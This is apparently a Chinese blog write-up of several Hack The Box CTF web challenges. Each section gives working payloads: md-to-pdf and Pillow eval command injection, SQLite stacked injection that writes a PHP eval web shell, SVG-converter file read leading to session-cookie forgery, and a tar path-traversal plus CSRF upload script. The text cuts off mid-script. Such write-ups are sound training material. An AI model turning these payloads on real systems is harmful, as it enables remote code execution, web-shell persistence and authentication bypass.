href=\"#BlinkerFluids\" class=\"headerlink\" title=\"BlinkerFluids\"></a>BlinkerFluids</h1><ul>\n<li>gray-matter</li>\n<li>md-to-pdf</li>\n</ul>\n<p>实现的功能就是用户可控输入，将md格式转换为pdf文件，使用的组件就是 md-to-pdf</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220515071114887.png\" alt=\"image-20220515071114887\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220515071229355.png\" alt=\"image-20220515071229355\"></p>\n<p>找到了相关cve漏洞，<a href=\"https://github.com/simonhaenisch/md-to-pdf/issues/99\">https://github.com/simonhaenisch/md-to-pdf/issues/99</a></p>\n<p>payload，机器不出网，写到static下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">---js</span><br><span class=\"line\">((require(&quot;child_process&quot;)).execSync(&quot;cat &#x2F;flag.txt &gt; &#x2F;app&#x2F;static&#x2F;test.txt&quot;))</span><br><span class=\"line\">---RCE</span><br></pre></td></tr></table></figure>\n\n<p>FLAG：HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}</p>\n<h1 id=\"Amidst-Us\"><a href=\"#Amidst-Us\" class=\"headerlink\" title=\"Amidst Us\"></a>Amidst Us</h1><ul>\n<li>Pillow 9.0.0</li>\n<li>ImageMath.eval</li>\n</ul>\n<blockquote>\n<p>The AmidstUs tribe is a notorious group of sleeper agents for hire. We have plausible reasons to believe they are working with Draeger, so we have to take action to uncover their identities. Ulysses and bonnie have infiltrated their HQ and came across this mysterious portal on one of the unlocked computers. Can you hack into it despite the low visibility and get them access?</p>\n</blockquote>\n<p>下载附件审计代码，主要功能是上传一个图片，然后调用PIL库中的函数进行图像的更改</p>\n<p>可以看到调用了make_alpha()函数</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220515133018844.png\" alt=\"image-20220515133018844\"></p>\n<p>看一下功能，去获取传入的background，然后下面调用了eval函数，根据以往经验，这个eval肯定是存在问题的</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220515133133299.png\"></p>\n<p>果然找到相关cve信息 CVE-2022-22817 <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-22817\">NVD - CVE-2022-22817 (nist.gov)</a>，Pillow 9.0.0 之前的 ImageMath.eval 允许计算任意表达式</p>\n<p>我们紧接着看下面的代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">alpha = ImageMath.<span class=\"built_in\">eval</span>(</span><br><span class=\"line\">\t\t\t<span class=\"string\">f&#x27;&#x27;&#x27;float(</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\tmax(</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\tmax(</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\tmax(</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\tdifference1(red_band, <span class=\"subst\">&#123;color[<span class=\"number\">0</span>]&#125;</span>),</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\tdifference1(green_band, <span class=\"subst\">&#123;color[<span class=\"number\">1</span>]&#125;</span>)</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t),</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\tdifference1(blue_band, <span class=\"subst\">&#123;color[<span class=\"number\">2</span>]&#125;</span>)</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t),</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\tmax(</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\tmax(</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\tdifference2(red_band, <span class=\"subst\">&#123;color[<span class=\"number\">0</span>]&#125;</span>),</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\tdifference2(green_band, <span class=\"subst\">&#123;color[<span class=\"number\">1</span>]&#125;</span>)</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\t),</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t\tdifference2(blue_band, <span class=\"subst\">&#123;color[<span class=\"number\">2</span>]&#125;</span>)</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t)</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t\t)</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t)&#x27;&#x27;&#x27;</span>,</span><br><span class=\"line\">\t\t\tdifference1=<span class=\"keyword\">lambda</span> source, color: (source - color) / (<span class=\"number\">255.0</span> - color),</span><br><span class=\"line\">\t\t\tdifference2=<span class=\"keyword\">lambda</span> source, color: (color - source) / color,</span><br><span class=\"line\">\t\t\tred_band=img_bands[<span class=\"number\">0</span>],</span><br><span class=\"line\">\t\t\tgreen_band=img_bands[<span class=\"number\">1</span>],</span><br><span class=\"line\">\t\t\tblue_band=img_bands[<span class=\"number\">2</span>]</span><br><span class=\"line\">\t\t)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tnew_bands = [</span><br><span class=\"line\">\t\t\tImageMath.<span class=\"built_in\">eval</span>(</span><br><span class=\"line\">\t\t\t\t<span class=\"string\">&#x27;convert((image - color) / alpha + color, &quot;L&quot;)&#x27;</span>,</span><br><span class=\"line\">\t\t\t\timage=img_bands[i],</span><br><span class=\"line\">\t\t\t\tcolor=color[i],</span><br><span class=\"line\">\t\t\t\talpha=alpha</span><br><span class=\"line\">\t\t\t)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>)</span><br><span class=\"line\">\t\t]</span><br></pre></td></tr></table></figure>\n\n<p>payload，老样子不出网</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&quot;image&quot;:&quot;iVBORw0...&quot;,&quot;background&quot;:[255,255,&quot;__import__(&#39;os&#39;).system(&#39;cat &#x2F;flag.txt &gt; &#x2F;app&#x2F;application&#x2F;static&#x2F;js&#x2F;test.txt&#39;)&quot;]&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220515142221771.png\" alt=\"image-20220515142221771\"></p>\n<p>FLAG：HTB{i_slept_my_way_to_rce}</p>\n<h1 id=\"Intergalactic-Post\"><a href=\"#Intergalactic-Post\" class=\"headerlink\" title=\"Intergalactic Post\"></a>Intergalactic Post</h1><ul>\n<li>SQlite3 写shell</li>\n</ul>\n<blockquote>\n<p>The biggest intergalactic newsletter agency has constantly been spreading misinformation about the energy crisis war. Bonnie’s sources confirmed a hostile takeover of the agency took place a few months back, and we suspect the Golden Fang army is behind this. Ulysses found us a potential access point to their agency servers. Can you hack their newsletter subscribe portal and get us entry?</p>\n</blockquote>\n<p>使用sqlite3，发现一个注入处而且使用的是exec，可以堆叠写shell，关于sqlite的注入：<a href=\"https://xz.aliyun.com/t/8627#toc-5\">https://xz.aliyun.com/t/8627#toc-5</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220515232701843.png\" alt=\"image-20220515232701843\"></p>\n<p>本地测试成功</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">test2&#39;,&#39;1@qq.com&#39;);ATTACH DATABASE &#39;D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;htb&#x2F;challenge&#x2F;tmp&#x2F;shell.php&#39; AS test ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES (&#39;&lt;?php phpinfo();?&gt;&#39;);--</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220516134739755.png\" alt=\"image-20220516134739755\"></p>\n<p>对于题目找对写的路径就行了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">X-Forwarded-For: test2&#39;,&#39;1@qq.com&#39;);ATTACH DATABASE &#39;static&#x2F;shell.php&#39; AS shell;create TABLE shell.exp (payload text); insert INTO shell.exp (payload) VALUES (&#39;&lt;?php @eval($_POST[&quot;x&quot;]); ?&gt;&#39;);--</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220516135539466.png\" alt=\"image-20220516135539466\"></p>\n<p>FLAG：HTB{inj3ct3d_th3_tru7h}</p>\n<h1 id=\"Mutation-Lab\"><a href=\"#Mutation-Lab\" class=\"headerlink\" title=\"Mutation Lab\"></a>Mutation Lab</h1><ul>\n<li>nodejs</li>\n<li>cookie-session伪造</li>\n<li>convert-svg-core</li>\n</ul>\n<blockquote>\n<p>One of the renowned scientists in the research of cell mutation, Dr. Rick, was a close ally of Draeger. The by-products of his research, the mutant army wrecked a lot of havoc during the energy-crisis war. To exterminate the leftover mutants that now roam over the abandoned areas on the planet Vinyr, we need to acquire the cell structures produced in Dr. Rick’s mutation lab. Ulysses managed to find a remote portal with minimal access to Dr. Rick’s virtual lab. Can you help him uncover the experimentations of the wicked scientist?</p>\n</blockquote>\n<p>可以看到需要以admin用户登录</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220515165415343.png\" alt=\"image-20220515165415343\"></p>\n<p>抓包看看，发现返回一个 session 和 session.sig</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220515173221436.png\" alt=\"image-20220515173221436\"></p>\n<p>session为 <code>&#123;&quot;username&quot;:&quot;123-1234-1233&quot;&#125;</code> 很明显需要伪造身份为admin，但是<strong>session.sig作为验证session的东西，需要知道secret_key</strong> 来进行伪造。</p>\n<p>注册用户登录成功后发现有导出图片功能，抓包让其报错，可知用到了 <strong>convert-svg-core</strong> 库，搜索其漏洞：<a href=\"https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-1582785\">https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-1582785</a></p>\n<p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&quot;svg&quot;:&quot;&lt;svg-dummy&gt;&lt;&#x2F;svg-dummy&gt;&lt;iframe src&#x3D;\\&quot;file:&#x2F;&#x2F;&#x2F;app&#x2F;index.js\\&quot; width&#x3D;\\&quot;100%\\&quot; height&#x3D;\\&quot;1000px\\&quot;&gt;&lt;&#x2F;iframe&gt;&lt;svg version&#x3D;\\&quot;1.1\\&quot; xmlns&#x3D;\\&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg\\&quot; xmlns:xlink&#x3D;\\&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xlink\\&quot; width&#x3D;\\&quot;500\\&quot; height&#x3D;\\&quot;400\\&quot; viewBox&#x3D;\\&quot;0,0,500,400\\&quot;&gt;&lt;&#x2F;svg&gt;&quot;&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220515174121644.png\" alt=\"image-20220515174121644\"></p>\n<p>再去获取 .env 文件得到 key</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">SESSION_SECRET_KEY&#x3D;5921719c3037662e94250307ec5ed1db</span><br></pre></td></tr></table></figure>\n\n<p>开始伪造</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> session = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;cookie-session&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">var</span> express = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;express&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> app = express()</span><br><span class=\"line\">app.use(session(&#123;</span><br><span class=\"line\">  name: <span class=\"string\">&#x27;session&#x27;</span>,</span><br><span class=\"line\">  keys: [<span class=\"string\">&#x27;5921719c3037662e94250307ec5ed1db&#x27;</span>]</span><br><span class=\"line\">&#125;))</span><br><span class=\"line\"></span><br><span class=\"line\">app.get(<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, res, next</span>) </span>&#123;</span><br><span class=\"line\">    req.session.username = <span class=\"string\">&#x27;admin&#x27;</span></span><br><span class=\"line\">    res.json(&#123;</span><br><span class=\"line\">    wow: <span class=\"string\">&#x27;Y0ng&#x27;</span>,</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">app.listen(<span class=\"number\">3000</span>)</span><br></pre></td></tr></table></figure>\n\n<p>替换session与session.sig，成功admin身份登录</p>\n<p>FLAG：HTB{fr4m3d_th3_s3cr37s_f0rg3d_th3_entrY}</p>\n<h1 id=\"Acnologia-Portal\"><a href=\"#Acnologia-Portal\" class=\"headerlink\" title=\"Acnologia Portal\"></a>Acnologia Portal</h1><ul>\n<li>flask</li>\n<li>CSRF</li>\n<li>目录穿越zip</li>\n<li>SSTI</li>\n</ul>\n<blockquote>\n<p>Bonnie has confirmed the location of the Acnologia spacecraft operated by the Golden Fang mercenary. Before taking over the spaceship, we need to disable its security measures. Ulysses discovered an accessible firmware management portal for the spacecraft. Can you help him get in?</p>\n</blockquote>\n<p>首先通读代码，发现其中的report路由下可以添加报告，然后bot会去查看report，所以这里存在一个xss</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220516150331246.png\" alt=\"image-20220516150331246\"></p>\n<p>看到bot以admin身份进行登录</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220516150509630.png\" alt=\"image-20220516150509630\"></p>\n<p>接着往下看函数功能，有一个上传的功能，这里有个 is_admin 的判断</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220516150619486.png\"></p>\n<p>限制了本地登录，所以窃取cookie进行登录不可实现了，可以尝试借助xss，然后让管理员上传文件然后去打SSTI</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220516150720086.png\" alt=\"image-20220516150720086\"></p>\n<p>来看一下上传的功能点，重点就是这里解压文件处，可以利用构造带 <code>..</code> 来进行目录穿越</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220516210533728.png\" alt=\"image-20220516210533728\"></p>\n<p>如果去翻看文档，会发现这里就是一个警告</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220516210605254.png\" alt=\"image-20220516210605254\"></p>\n<p>本地实验：</p>\n<p>脚本生成个目录穿越的 test.tar.gz，这里的目录以及文件必须要存在</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> tarfile</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">#创建压缩包名</span></span><br><span class=\"line\">tar = tarfile.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;/tmp/test.tar.gz&quot;</span>,<span class=\"string\">&quot;w:gz&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#创建压缩包</span></span><br><span class=\"line\">tar.add(<span class=\"string\">&#x27;../app/application/templates/y0ng.html&#x27;</span>)</span><br><span class=\"line\">tar.close()</span><br></pre></td></tr></table></figure>\n\n<p>app.py</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Blueprint, jsonify, redirect, render_template, request,Flask</span><br><span class=\"line\"><span class=\"keyword\">import</span> functools, tarfile, tempfile, os</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span>,methods=[<span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">hello_world</span>():</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">&#x27;file&#x27;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> request.files:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> response(<span class=\"string\">&#x27;Missing required parameters!&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    extraction = extract_firmware(request.files[<span class=\"string\">&#x27;file&#x27;</span>])</span><br><span class=\"line\">    <span class=\"keyword\">if</span> extraction:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> response(<span class=\"string\">&#x27;Firmware update initialized successfully.&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> response(<span class=\"string\">&#x27;Something went wrong, please try again!&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">extract_firmware</span>(<span class=\"params\">file</span>):</span>  <span class=\"comment\"># 上传文件功能</span></span><br><span class=\"line\">    tmp  = tempfile.gettempdir()   <span class=\"comment\"># /tmp 临时目录</span></span><br><span class=\"line\">    path = os.path.join(tmp, file.filename)  <span class=\"comment\"># /tmp/test.txt</span></span><br><span class=\"line\">    file.save(path)  <span class=\"comment\"># 保存文件</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> tarfile.is_tarfile(path): <span class=\"comment\"># 是tarfile</span></span><br><span class=\"line\">        tar = tarfile.<span class=\"built_in\">open</span>(path, <span class=\"string\">&#x27;r:gz&#x27;</span>)  <span class=\"comment\"># gzip打开</span></span><br><span class=\"line\">        tar.extractall(tmp)  <span class=\"comment\"># 解压所有文件</span></span><br><span class=\"line\">        <span class=\"comment\"># exp：/tmp/ ../app/application/templates/y0ng.html</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#rand_dir = generate(15)</span></span><br><span class=\"line\">        extractdir = <span class=\"string\">&quot;/app/application/static/firmware_extract/rand&quot;</span> <span class=\"comment\"># /app/application/static/firmware_extract</span></span><br><span class=\"line\">        os.makedirs(extractdir, exist_ok=<span class=\"literal\">True</span>) <span class=\"comment\"># 创建目录</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> tarinfo <span class=\"keyword\">in</span> tar:</span><br><span class=\"line\">            name = tarinfo.name</span><br><span class=\"line\">            <span class=\"keyword\">if</span> tarinfo.isreg():</span><br><span class=\"line\">                <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                    filename = <span class=\"string\">f&#x27;<span class=\"subst\">&#123;extractdir&#125;</span>/<span class=\"subst\">&#123;name&#125;</span>&#x27;</span> <span class=\"comment\"># /app/application/static/firmware_extract/rand/&#123;name&#125;</span></span><br><span class=\"line\">                    <span class=\"comment\"># /app/application/static/firmware_extract/rand/  name = ../../../templates/index.html</span></span><br><span class=\"line\">                    os.rename(os.path.join(tmp, name), filename)</span><br><span class=\"line\">                    <span class=\"keyword\">continue</span></span><br><span class=\"line\">                <span class=\"keyword\">except</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">pass</span></span><br><span class=\"line\">            os.makedirs(<span class=\"string\">f&#x27;<span class=\"subst\">&#123;extractdir&#125;</span>/<span class=\"subst\">&#123;name&#125;</span>&#x27;</span>, exist_ok=<span class=\"literal\">True</span>)</span><br><span class=\"line\">        tar.close()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">response</span>(<span class=\"params\">message</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> jsonify(&#123;<span class=\"string\">&#x27;message&#x27;</span>: message&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">   app.run(host=<span class=\"string\">&#x27;0.0.0.0&#x27;</span>, port=<span class=\"number\">3000</span>, debug=<span class=\"literal\">True</span>)</span><br></pre></td></tr></table></figure>\n\n<p>上传文件：成功了！</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220516210910214.png\" alt=\"image-20220516210910214\"></p>\n<p>剩下的就是通过 js 达到一个CSRF的效果</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">      <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">submitRequest</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">      </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> xhr = <span class=\"keyword\">new</span> XMLHttpRequest();</span><br><span class=\"line\">        xhr.open(<span class=\"string\">&quot;POST&quot;</span>, <span class=\"string\">&quot;http://localhost:1337/api/firmware/upload&quot;</span>);</span><br><span class=\"line\">        xhr.setRequestHeader(<span class=\"string\">&quot;Accept&quot;</span>, <span class=\"string\">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>);</span><br><span class=\"line\">        xhr.setRequestHeader(<span class=\"string\">&quot;Accept-Language&quot;</span>, <span class=\"string\">&quot;de-de,de;q=0.8,en-us;q=0.5,en;q=0.3&quot;</span>);</span><br><span class=\"line\">    \txhr.setRequestHeader(<span class=\"string\">&quot;Origin&quot;</span>, <span class=\"string\">&quot;null&quot;</span>);</span><br><span class=\"line\">        xhr.setRequestHeader(<span class=\"string\">&quot;Content-Type&quot;</span>, <span class=\"string\">&quot;multipart/form-data; boundary=----WebKitFormBoundarypXheHIDWfea2zg7D&quot;</span>);</span><br><span class=\"line\">        xhr.withCredentials = <span class=\"string\">&quot;true&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> body = </span><br><span class=\"line\">          <span class=\"string\">&quot;------WebKitFormBoundarypXheHIDWfea2zg7D\\r\\n&quot;</span> +</span><br><span class=\"line\">          <span class=\"string\">&quot;Content-Disposition: form-data; name=\\&quot;file\\&quot;; filename=\\&quot;test.tar.gz\\&quot;\\r\\n&quot;</span> +</span><br><span class=\"line\">          <span class=\"string\">&quot;Content-Type: application/x-gzip\\r\\n&quot;</span> +</span><br><span class=\"line\">          <span class=\"string\">&quot;\\r\\n&quot;</span> +<span class=\"built_in\">decodeURIComponent</span>(atob(<span class=\"string\">&quot;H4sICMFwg2IC/3JvdXRlcy50YXIA7VdfbxtFEPezP8VWeThbOp2dNI2lSpYiJEB9QCAKT1F1WvvWztL7Y3b3YkyFlEqVoEFQkCjiTyQaRBEPiJSXtjQBvkzshG/B7O7t2Xc+JxFErUA3UuK73bnfzOzMb3fWcRqO08CDgfzzaRcLGoWNjh+TAaOh4A0WxYJwZzCq/GNpgrRaLfULkv9tXVltVZZXV1aba63m8tpKpbnSXLt8pYKalecgMReYIVRhUSRO0ztrPh/cf0RoMIiYQO/wKKz2WBSgmTJwPCxwB3OCEq23OWE2eoWyYIgZsdGbRA7byOvYKKB9hgVxvc48TiyobzAod7EX0NBG5D3BcFe4vQRPf9fzMb9plF8ydWgrD2lvZCNGPMpIV8in0CPMFSQY+GBaDrwbEy5mgFw/6tPQwHVjBt8IN1ZxqClXfgN4nnlP56Du1ct8OJ1IGMQtyqkADPlSrQ5JB7WnTtcsGLBs5LohDojr1qt4QLMKMJBRqHqkB2HwQRRyUgsI57hP6lerCIQREbPQLETtlpVMW1dR8vQBAKyDTUeRtmY1ADsgYjPyeHvDevXlt6wbdWVBhVrL4uZWs2YpJWdTBL6Vxx01w/4ibDk3B50EZG3i7k2FBoGnaMpQBu6N16+neDIHbsZh2kMhpCDJtgMVJddEzxVafY1yTsM+MrlGA8xgwQVh/JJVt9Fqc7mqvpYFDwkyyH0iFHStjnKypNIweXA4Prx3/M2d468Pxr/fn9x/NPnkFwUknZY5BTCJKZFqlhmEUC0LIJXmAHM+jJiX0TSDWrM6G3WKHDH1blQvInyJDX5ImjuwAmzk9KgPam5nVDN22+ahDpOMC7k2S2jy3cOT/e/R8Rc/TT56Agty9Ofe5Pb+nOPGafnsTCNvnyeKa+EW9qmXWQDzWRLGZW1wSmTltXJQZ0j7V1yaMmqEY7EJO4RkOqwTj7tdYFYv9v3RpTkSMNKnHFZnERHM/Fk8M3pTqs2So9DKHD+0FlP70wukyXlr/39S+al7cuYUN3Rp+YxgbwTHHmQqZz4kQ3fGhXmTdhpt2zzUJe2eHIx3Hky+fDRT2F7H4VC08qDCnlcz0PX8ZDcKApoGUeyzKb4zueBhvtmJMOStXl3PHqyqSNP5s8iQKhazwfQKDR/8KiAerIlpT9D422dHB48L3TEwroQxLmUGIRMGKCkI7PtJgecO4g0WDR0RuR7tyt2wB+UJIwjajgyicm7y1R/HPzyb3N2e7N5dFJruJgr5XhSLVneh0mPyoqkfRF7sE5dmOZ2OzpBfuZvRUiMFtJ9iJrxXihcRi6SGXj1wRPeytdRaO32ytcW2+m8n60082Brasw2lk24PkGetNN7/7eTXveM7j8effaqpuoihWv8Mjs42m8mxu39vsvNw/PnO0dPtyc97CDpTOImPdz/W7zonaWO+kOvXVDJMYAVUL6zTeOBH2DtXna6brh+dX5aQ+uKv3e2TH29nWRsPPLlZTIvdgt2aWLo6wrQ45SC/iEJJbiqQESiU/LWlljG3oV25odJz9HTn6BC25w/lPpS4OsU6xbN0D9ORQlBUUOh+3s9lx7EWpfR6JLMioxtCgaIhi8I+HCI+kdc5wUYI9zENp31TrrPZomRY1Nf8y8Qu5VOqLaU1rZdEU5GnpJzdgFHSbUKN610Ums3k+nV6jyXt6DPFUJi3E0P5w0xf/hacZHrSuDpzT8weDuaWKi9hgF8ppZRSSimllFJKKaWUUkoppZRSSimllFJKKaWU5yl/A8Vb63YAKAAA&quot;</span>).replace(<span class=\"regexp\">/%/g</span>, <span class=\"string\">&#x27;%25&#x27;</span>))+</span><br><span class=\"line\">          <span class=\"string\">&quot;\\r\\n&quot;</span> +</span><br><span class=\"line\">          <span class=\"string\">&quot;------WebKitFormBoundarypXheHIDWfea2zg7D--\\r\\n&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> aBody = <span class=\"keyword\">new</span> <span class=\"built_in\">Uint8Array</span>(body.length);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; aBody.length; i++)</span><br><span class=\"line\">          aBody[i] = body.charCodeAt(i);</span><br><span class=\"line\">        xhr.send(<span class=\"keyword\">new</span> Blob([aBody]));</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">\t  submitRequest();</span><br><span class=\"line\">\t&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<p>本地完全没问题，但是题目环境不行，起个docker试试，顺带记录一下起docker换源的经历</p>\n<p>先 sh build-docker.sh，然后会生成一个docker image，参考：<a href=\"https://blog.csdn.net/weixin_37551036/article/details/114482730\">https://blog.csdn.net/weixin_37551036/article/details/114482730</a> 进入docker，然后换源，在Dockerfile添加，速度起飞</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">RUN sed -i &#39;s&#x2F;dl-cdn.alpinelinux.org&#x2F;mirrors.ustc.edu.cn&#x2F;g&#39; &#x2F;etc&#x2F;apk&#x2F;repositories</span><br></pre></td></tr></table></figure>\n\n<p>上TMD大当了，卧槽，发现没有这个路由，少了个 api/ </p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220517004550340.png\" alt=\"image-20220517004550340\"></p>\n<p>填入payload</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220517095325660.png\" alt=\"image-20220517095325660\"></p>\n<p>成功</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220517095413034.png\" alt=\"image-20220517095413034\"></p>\n<p>但是发现它不能立即渲染html，很是难受，现在想法是让tarbomb来crash掉flask应用，等到重启时，便达到目的</p>\n<p>run.py</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python2 eval.py run.py -p app&#x2F; -d 2 -o unix -f run.tar.gz</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> application.main <span class=\"keyword\">import</span> app</span><br><span class=\"line\"><span class=\"keyword\">from</span> application.database <span class=\"keyword\">import</span> migrate_db</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> app.app_context():</span><br><span class=\"line\">    migrate_db()</span><br><span class=\"line\"></span><br><span class=\"line\">app.run(host=<span class=\"string\">&#x27;0.0.0.0&#x27;</span>, port=<span class=\"number\">1337</span>, debug=<span class=\"literal\">True</span>, use_evalex=<span class=\"literal\">True</span>)</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">      <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">submitRequest</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">      </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> xhr = <span 